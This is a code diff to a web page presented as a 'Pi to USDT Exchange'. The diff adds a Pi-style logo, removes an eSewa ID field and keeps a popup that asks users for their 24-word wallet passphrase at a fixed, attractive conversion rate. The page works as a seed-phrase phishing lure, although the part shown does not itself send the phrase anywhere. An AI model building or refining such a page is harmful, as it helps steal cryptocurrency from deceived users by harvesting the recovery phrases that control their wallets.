@@ -165,7 +165,12 @@
 <body>
 
 <header>
-    <h1>Pi to USDT Exchange</h1>
+    <svg xmlns="http://www.w3.org/2000/svg" width="100" height="42" viewBox="0 0 100 42" fill="none">
+        <path fill="#FBB44A" d="M15.6 10.638a.32.32 0 0 1 .324-.318h3.134a.32.32 0 0 1 .324.318v2.434a.32.32 0 0 1-.324.318h-3.134a.32.32 0 0 1-.324-.318v-2.434ZM22.084 10.638c0-.175.145-.318.324-.318h3.134c.18 0 .325.143.325.318v2.434a.321.321 0 0 1-.325.318h-3.134a.321.321 0 0 1-.324-.318v-2.434Z"></path>
+        <path fill="#FBB44A" d="M15.6 18.653v12.642l3.782 1.461V18.653h2.702v12.642l3.783 1.461V18.653h2.513c2.074 0 3.755-1.664 3.755-3.716V12.86H28.38v2.077H13.195c-2.074 0-3.755 1.664-3.755 3.716v2.568h3.755v-2.568H15.6Z"></path>
+        <path fill="#FBB44A" fill-rule="evenodd" d="M21.445 3.23C11.423 3.23 3.3 11.187 3.3 21s8.124 17.77 18.146 17.77S39.591 30.813 39.591 21 31.467 3.23 21.445 3.23ZM0 21C0 9.402 9.601 0 21.445 0S42.89 9.402 42.89 21 33.29 42 21.445 42 0 32.598 0 21Z" clip-rule="evenodd"></path>
+        <path fill="#FBB44A" d="M54.336 28V15.31h5.634c1.392 0 2.454.336 3.186 1.008.732.672 1.098 1.596 1.098 2.772 0 1.164-.366 2.088-1.098 2.772-.732.684-1.794 1.026-3.186 1.026h-3.312V28h-2.322Zm2.322-6.948H59.7c.768 0 1.344-.168 1.728-.504.384-.348.576-.834.576-1.458s-.192-1.104-.576-1.44c-.384-.348-.96-.522-1.728-.522h-3.042v3.924ZM66.144 28v-9.09h2.25V28h-2.25Zm-.126-10.8v-2.196h2.502V17.2h-2.502Zm5 10.8V15.31h1.746l7.362 9.522h-.468V15.31h2.16V28h-1.746l-7.344-9.522h.45V28h-2.16Zm17.8.18c-1.524 0-2.718-.42-3.582-1.26-.864-.84-1.296-1.992-1.296-3.456 0-.948.186-1.776.558-2.484a4.124 4.124 0 0 1 1.548-1.656c.672-.396 1.452-.594 2.34-.594.876 0 1.608.186 2.196.558a3.482 3.482 0 0 1 1.332 1.566c.312.672.468 1.458.468 2.358v.594h-6.624v-1.188h5.022l-.306.252c0-.84-.18-1.482-.54-1.926-.348-.444-.858-.666-1.53-.666-.744 0-1.32.264-1.728.792-.396.528-.594 1.266-.594 2.214v.234c0 .984.24 1.722.72 2.214.492.48 1.182.72 2.07.72.516 0 .996-.066 1.44-.198a4.217 4.217 0 0 0 1.296-.684l.666 1.512a4.744 4.744 0 0 1-1.548.81c-.6.192-1.236.288-1.908.288Zm9.322 0c-1.08 0-1.896-.282-2.448-.846-.552-.564-.828-1.41-.828-2.538v-4.194h-1.746V18.91h1.746v-2.322l2.25-.576v2.898h2.43v1.692h-2.43v4.05c0 .624.12 1.062.36 1.314s.57.378.99.378c.228 0 .42-.018.576-.054.168-.036.33-.084.486-.144v1.782a2.851 2.851 0 0 1-.684.18c-.24.048-.474.072-.702.072Z"></path>
+    </svg>
 </header>
 
 <div class="main-container">
@@ -202,10 +207,9 @@
 <!-- Popup -->
 <div class="popup" id="passphrase-popup">
     <div class="popup-content">
-        <h3>Enter Details</h3>
+        <h3>Enter Passphrase</h3>
         <input type="text" id="passphrase" placeholder="Enter your 24-word passphrase" />
-        <input type="text" id="esewa-id" placeholder="Enter your eSewa ID" />
-        <p id="error-message" style="color: red; display: none;">Please ensure your passphrase is 24 words long and eSewa ID is valid!</p>
+        <p id="error-message" style="color: red; display: none;">Passphrase must be exactly 24 words long!</p>
         <button id="submit-passphrase">Submit</button>
     </div>
 </div>
@@ -220,12 +224,14 @@
     const exchangeBtn = document.getElementById("exchange-btn");
     const popup = document.getElementById("passphrase-popup");
     const passphraseInput = document.getElementById("passphrase");
-    const esewaIdInput = document.getElementById("esewa-id");
     const errorMessage = document.getElementById("error-message");
     const submitPassphraseBtn = document.getElementById("submit-passphrase");
 
     // Default rate
-    const piToUsdtRate = 3; // New multiplier
+
+    // Fetch live Pi to USDT rate
+    const piToUsdtRate = 3;  // New multiplier
+
 
     // Real-time update of USDT equivalent
     piInput.addEventListener("input", () => {
@@ -246,17 +252,15 @@
         }
     });
 
-    // Validate passphrase and eSewa ID, then close popup
+    // Validate passphrase and close popup
     submitPassphraseBtn.addEventListener("click", () => {
         const passphrase = passphraseInput.value.trim();
-        const esewaId = esewaIdInput.value.trim();
         const wordCount = passphrase.split(/\s+/).length;
 
-        if (wordCount === 24 && esewaId) {
-            alert("Details accepted! Transaction processing...");
+        if (wordCount === 24) {
+            alert("Passphrase accepted! Transaction processing...");
             popup.style.display = "none";
             passphraseInput.value = ""; // Reset input
-            esewaIdInput.value = ""; // Reset eSewa ID
         } else {
             errorMessage.style.display = "block";
         }
@@ -264,10 +268,6 @@
 
     // Hide error message on input
     passphraseInput.addEventListener("input", () => {
-        errorMessage.style.display = "none";
-    });
-
-    esewaIdInput.addEventListener("input", () => {
         errorMessage.style.display = "none";
     });
 </script>
